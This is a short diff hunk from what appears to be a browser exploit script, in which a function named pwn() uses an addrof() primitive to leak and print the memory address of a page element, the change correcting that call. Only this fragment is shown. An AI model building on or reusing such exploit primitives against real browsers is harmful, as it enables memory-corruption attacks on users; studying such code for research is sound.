@@ -518,7 +518,7 @@ function pwn()
         });
     } else {
        var wrapper = document.createElement('div');
-       var wrapperaddr = addrof(wrapper + 0x20);
+       var wrapperaddr = addrof(wrapper);
        print("wrapper addr:" + wrapperaddr);
        
 
